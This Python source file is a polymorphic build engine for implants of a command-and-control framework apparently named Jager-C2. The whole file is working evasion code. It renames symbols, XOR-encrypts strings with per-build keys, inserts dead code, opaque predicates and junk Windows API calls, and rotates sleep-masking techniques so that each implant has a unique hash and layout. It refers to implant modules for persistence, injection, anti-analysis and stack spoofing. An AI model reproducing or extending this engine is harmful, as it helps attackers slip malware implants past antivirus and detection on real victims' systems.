"""
polymorphic.py - Polymorphic Build Engine for Jager-C2

Generates unique implant binaries by applying compile-time transformations:
- C source AST mutation (variable/function renaming, control flow changes)
- String encryption with per-build keys
- Dead code insertion
- Opaque predicate insertion
- Instruction substitution
- Import shuffling
- Section name randomization

Each build produces a binary with unique:
- File hash (SHA256)
- String table
- Import table ordering
- Code section layout
- Symbol names (stripped but affects code generation)
"""

import os
import re
import random
import hashlib
import string
import json
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field

# Files that use OBF() heavily and should not be renamed during polymorphic transforms.
SKIP_RENAME_FILES = frozenset({
    "persistence.c",
    "beacon.c",
    "bof_loader.c",
    "syscalls.c",
    "config.h",
    "tasks.c",
    "tasks_postex.c",
    "transport.c",
    "transport_dns.c",
    "transport_smb.c",
    "transport_tcp.c",
    "transport_front.c",
    "transport_failover.c",
    "tunnel.c",
    "p2p_relay.c",
    "malleable.c",
    "anti_analysis.c",
    "injection.c",
    "sleep_mask.c",
    "stack_spoof.c",
})


@dataclass
class PolymorphicConfig:
    """Configuration for a polymorphic build."""
    seed: int = 0
    rename_functions: bool = True
    rename_variables: bool = True
    encrypt_strings: bool = True
    insert_dead_code: bool = True
    insert_opaque_predicates: bool = True
    junk_api_calls: bool = True
    shuffle_functions: bool = True
    randomize_sections: bool = True
    string_encrypt_algo: str = "xor_rolling"  # xor_rolling, rc4, aes_ctr
    dead_code_density: float = 0.15  # 15% dead code ratio
    max_junk_calls: int = 5
    obf_key: int = 0  # 0 = generate random per build


@dataclass
class BuildManifest:
    """Records what transformations were applied to a build."""
    build_id: str
    seed: int
    transformations: List[str] = field(default_factory=list)
    renamed_symbols: Dict[str, str] = field(default_factory=dict)
    string_keys: Dict[str, bytes] = field(default_factory=dict)
    file_hash: str = ""


class PolymorphicEngine:
    """Applies polymorphic transformations to C source code."""

    def __init__(self, config: PolymorphicConfig):
        self.config = config
        self.rng = random.Random(config.seed)
        if config.obf_key:
            self.obf_key = config.obf_key & 0xFF
        else:
            self.obf_key = self.rng.randint(1, 255)
        self.manifest = BuildManifest(
            build_id=self._generate_build_id(),
            seed=config.seed,
        )
        self.sleep_technique: Optional[int] = None
        self.manifest.string_keys["obf_key"] = bytes([self.obf_key])

    def _generate_build_id(self) -> str:
        """Generate unique build identifier."""
        raw = f"{self.config.seed}-{self.rng.getrandbits(64)}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def _random_name(self, prefix: str = "", length: int = 8) -> str:
        """Generate a random C-compatible identifier."""
        first = self.rng.choice(string.ascii_lowercase)
        rest = ''.join(self.rng.choices(string.ascii_lowercase + string.digits + '_', k=length - 1))
        return f"{prefix}{first}{rest}"

    def transform_source(self, source: str, filename: str = "") -> str:
        """Apply all configured transformations to C source."""
        if self.config.rename_functions:
            source = self._rename_functions(source)
            self.manifest.transformations.append("rename_functions")

        if self.config.rename_variables:
            source = self._rename_variables(source)
            self.manifest.transformations.append("rename_variables")

        if self.config.encrypt_strings:
            source = self._encrypt_strings(source)
            self.manifest.transformations.append("encrypt_strings")

        if self.config.insert_dead_code:
            source = self._insert_dead_code(source)
            self.manifest.transformations.append("dead_code")

        if self.config.insert_opaque_predicates:
            source = self._insert_opaque_predicates(source)
            self.manifest.transformations.append("opaque_predicates")

        if self.config.junk_api_calls:
            source = self._insert_junk_api_calls(source)
            self.manifest.transformations.append("junk_api_calls")

        return source

    def _rename_functions(self, source: str) -> str:
        """Rename internal (static) functions to random names."""
        # Find static function definitions
        pattern = r'\bstatic\s+\w+\s+(\w+)\s*\('
        matches = sorted(set(re.findall(pattern, source)))

        for func_name in matches:
            if func_name.startswith('_') or len(func_name) < 3:
                continue
            new_name = self._random_name("fn_")
            source = re.sub(r'\b' + re.escape(func_name) + r'\b', new_name, source)
            self.manifest.renamed_symbols[func_name] = new_name

        return source

    def _rename_variables(self, source: str) -> str:
        """Rename local variables to random names."""
        # Find local variable declarations (simple heuristic)
        pattern = r'\b(DWORD|BOOL|int|char|BYTE|PVOID|HANDLE|SIZE_T)\s+(\w+)\s*[;=\[]'
        matches = re.findall(pattern, source)

        renamed = set()
        for _, var_name in matches:
            if var_name in renamed or len(var_name) < 4:
                continue
            if var_name.startswith('g_') or var_name.isupper():
                continue  # Skip globals and constants
            new_name = self._random_name("v_")
            # Only rename within function scope (simplified - rename all)
            source = re.sub(r'\b' + re.escape(var_name) + r'\b', new_name, source)
            renamed.add(var_name)
            self.manifest.renamed_symbols[var_name] = new_name

        return source

    def _encrypt_strings(self, source: str) -> str:
        """Replace bare string literals with encrypted versions (skip OBF()-wrapped)."""
        pattern = r'"([^"\\](?:[^"\\]|\\.)*)"'

        def encrypt_match(line, match):
            original = match.group(1)
            if len(original) < 4:
                return match.group(0)
            if original.startswith('%') or original.startswith('\\'):
                return match.group(0)

            start = match.start()
            prefix = line[:start].rstrip()
            if prefix.endswith('OBF(') or prefix.endswith('OBF ('):
                return match.group(0)

            key = bytes(self.rng.randint(0, 255) for _ in range(16))
            encrypted = bytes(ord(c) ^ key[i % len(key)] for i, c in enumerate(original))
            self.manifest.string_keys[original[:20]] = key

            hex_bytes = ', '.join(f'0x{b:02x}' for b in encrypted)
            hex_key = ', '.join(f'0x{b:02x}' for b in key[:len(original)])
            return f'decrypt_str((BYTE[]){{ {hex_bytes} }}, {len(original)}, (BYTE[]){{ {hex_key} }})'

        lines = source.split('\n')
        result = []
        for line in lines:
            if line.strip().startswith('#') or line.strip().startswith('//'):
                result.append(line)
            else:
                result.append(re.sub(
                    pattern,
                    lambda m, ln=line: encrypt_match(ln, m),
                    line,
                ))

        return '\n'.join(result)

    def _insert_dead_code(self, source: str) -> str:
        """Insert dead code inside function bodies only (skip struct/enum blocks)."""
        dead_snippets = [
            "volatile int _dc_{id} = {val}; _dc_{id} ^= _dc_{id};",
            "if (0) {{ int _dd_{id} = {val}; (void)_dd_{id}; }}",
            "(void)GetTickCount(); (void)({val} ^ {val});",
        ]

        lines = source.split('\n')
        result = []
        depth = 0
        struct_depth = 0

        for line in lines:
            stripped = line.strip()
            open_count = line.count('{')
            close_count = line.count('}')

            if re.search(r'\b(struct|enum|union)\b', stripped) and '{' in stripped:
                struct_depth += stripped.count('{')
            elif struct_depth > 0:
                struct_depth += open_count - close_count
                if struct_depth < 0:
                    struct_depth = 0

            result.append(line)

            depth_after = depth + open_count - close_count
            in_function = depth_after > 0 and struct_depth == 0
            if (in_function and stripped.endswith(';')
                    and not stripped.startswith('#')
                    and not stripped.startswith('//')
                    and not re.match(r'^(typedef\s+)?(struct|enum|union)\b', stripped)
                    and not stripped.endswith('{')
                    and self.rng.random() < self.config.dead_code_density):
                snippet = self.rng.choice(dead_snippets)
                snippet = snippet.format(
                    id=self._random_name("", 4),
                    val=self.rng.randint(1, 0xFFFFFF),
                    sz=self.rng.randint(4, 32),
                )
                indent = len(line) - len(line.lstrip())
                result.append(f"{' ' * indent}{snippet}")

            depth = depth_after
            if depth < 0:
                depth = 0

        return '\n'.join(result)

    def _insert_opaque_predicates(self, source: str) -> str:
        """Insert conditions that always evaluate the same way but are hard to analyze statically."""
        predicates_true = [
            "((GetCurrentProcessId() | 1) > 0)",
            "((sizeof(void*) == 8) || (sizeof(void*) == 4))",
            "(GetTickCount() > 0)",
            "((1 << 0) == 1)",
        ]
        predicates_false = [
            "((sizeof(void*) == 3))",
            "(GetCurrentProcessId() == 0)",
            "((1 << 0) == 0)",
        ]

        lines = source.split('\n')
        result = []
        for line in lines:
            # Wrap some statements in opaque predicates
            stripped = line.strip()
            if (stripped and not stripped.startswith(('#', '//', 'if', 'else', 'for', 'while', 'return', '{', '}'))
                and stripped.endswith(';') and self.rng.random() < 0.05):
                pred = self.rng.choice(predicates_true)
                indent = len(line) - len(line.lstrip())
                result.append(f"{' ' * indent}if ({pred}) {{")
                result.append(line)
                result.append(f"{' ' * indent}}}")
            else:
                result.append(line)

        return '\n'.join(result)

    def _insert_junk_api_calls(self, source: str) -> str:
        """Insert junk API calls at function entry (top-level brace only)."""
        junk_calls = [
            "GetCurrentThreadId();",
            "GetTickCount64();",
            "QueryPerformanceCounter(&(LARGE_INTEGER){0});",
        ]

        lines = source.split('\n')
        result = []
        depth = 0
        struct_depth = 0
        insert_count = 0

        for line in lines:
            stripped = line.strip()
            open_count = line.count('{')
            close_count = line.count('}')

            if re.search(r'\b(struct|enum|union)\b', stripped) and '{' in stripped:
                struct_depth += stripped.count('{')
            elif struct_depth > 0:
                struct_depth += open_count - close_count
                if struct_depth < 0:
                    struct_depth = 0

            prev_depth = depth
            result.append(line)

            # Function entry: depth 0 -> 1, not inside a struct
            if (stripped == '{' and prev_depth == 0 and struct_depth == 0
                    and insert_count < self.config.max_junk_calls
                    and self.rng.random() < 0.15):
                call = self.rng.choice(junk_calls)
                indent = len(line) - len(line.lstrip()) + 4
                result.append(f"{' ' * indent}{call}")
                insert_count += 1

            depth += open_count - close_count
            if depth < 0:
                depth = 0

        return '\n'.join(result)

    def generate_string_decryptor(self) -> str:
        """Generate the decrypt_str function used by encrypted strings.

        Returns a complete C source file that should be added to the compile
        unit. Uses thread-local storage to avoid static buffer sharing.
        """
        return """\
#include <windows.h>

static __thread char __jager_decrypt_buf[512];

__forceinline char* decrypt_str(BYTE* enc, int len, BYTE* key) {
    for (int i = 0; i < len && i < 511; i++) {
        __jager_decrypt_buf[i] = enc[i] ^ key[i % 16];
    }
    __jager_decrypt_buf[len < 511 ? len : 511] = 0;
    return __jager_decrypt_buf;
}
"""

    @property
    def has_encrypted_strings(self) -> bool:
        """Whether any strings were encrypted during transforms."""
        return len(self.manifest.string_keys) > 1  # obf_key is always present

    def select_sleep_technique(self, allowed: list = None) -> int:
        """Select sleep technique from allowed list.

        Default allows only foliage (2). When ekko (1) or zilean (3) are
        validated, add them to the allowed list to enable rotation.
        """
        if allowed is None:
            allowed = [2]  # foliage only until others are validated
        self.sleep_technique = self.rng.choice(allowed)
        return self.sleep_technique

    def get_compile_flags(self) -> List[str]:
        """Per-build compile flags (string obfuscation key)."""
        return [f"-DOBF_KEY=0x{self.obf_key:02X}"]

    def get_manifest(self) -> BuildManifest:
        """Return the build manifest documenting all transformations."""
        return self.manifest

    def save_manifest(self, path: str) -> None:
        """Save manifest to disk for audit/debugging."""
        data = {
            "build_id": self.manifest.build_id,
            "seed": self.manifest.seed,
            "transformations": self.manifest.transformations,
            "renamed_count": len(self.manifest.renamed_symbols),
            "encrypted_strings": len(self.manifest.string_keys),
            "obf_key": f"0x{self.obf_key:02X}",
        }
        if self.sleep_technique is not None:
            data["sleep_technique"] = self.sleep_technique
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)

    def validate_transforms(self, source_dir: str) -> tuple:
        """Verify polymorphic transforms didn't break compilation."""
        errors = []
        warnings = []
        renamed = self.manifest.renamed_symbols

        # Each old symbol must map to exactly one new name used consistently.
        reverse: Dict[str, list] = {}
        for old, new in renamed.items():
            reverse.setdefault(new, []).append(old)
        for new, olds in reverse.items():
            if len(olds) > 1:
                errors.append(f"rename collision: {new} <- {olds}")

        # Renamed symbols should not remain under their original names in transformed files.
        if renamed:
            for root, _, files in os.walk(source_dir):
                for fname in files:
                    if not fname.endswith('.c'):
                        continue
                    path = os.path.join(root, fname)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='replace') as f:
                            src = f.read()
                    except OSError as exc:
                        errors.append(f"{path}: read failed: {exc}")
                        continue
                    for old, new in renamed.items():
                        if re.search(r'\b' + re.escape(old) + r'\b', src):
                            warnings.append(
                                f"{path}: original symbol '{old}' still present after rename to '{new}'"
                            )

        if warnings:
            print(f"[*] Transform validation warnings ({len(warnings)}): {warnings[:5]}")

        return (len(errors) == 0, errors)


def select_sleep_technique(seed: Optional[int] = None, allowed: list = None) -> int:
    """Pick compile-time SLEEP_TECHNIQUE.

    Defaults to foliage (2). Pass allowed=[1,2,3] to enable rotation
    once ekko/zilean are validated.
    """
    if allowed is None:
        allowed = [2]
    if seed is not None:
        return random.Random(seed).choice(allowed)
    return random.choice(allowed)


def build_implant(source_dir: str, output_dir: str, config: Optional[PolymorphicConfig] = None) -> BuildManifest:
    """
    Build a polymorphic implant from source.

    1. Read all C source files
    2. Apply polymorphic transformations
    3. Write transformed sources to temp dir
    4. Compile with cross-compiler
    5. Return manifest
    """
    if config is None:
        config = PolymorphicConfig(seed=random.getrandbits(64))

    engine = PolymorphicEngine(config)

    # Find all .c files in source directory
    source_files = []
    for root, dirs, files in os.walk(source_dir):
        for f in files:
            if f.endswith('.c'):
                source_files.append(os.path.join(root, f))

    # Transform each source file
    for src_path in source_files:
        with open(src_path, 'r') as f:
            source = f.read()

        transformed = engine.transform_source(source, os.path.basename(src_path))

        rel = os.path.relpath(src_path, source_dir)
        out_path = os.path.join(output_dir, rel)
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, 'w') as f:
            f.write(transformed)

    manifest_path = os.path.join(output_dir, 'polymorphic-manifest.json')
    engine.save_manifest(manifest_path)
    return engine.get_manifest()
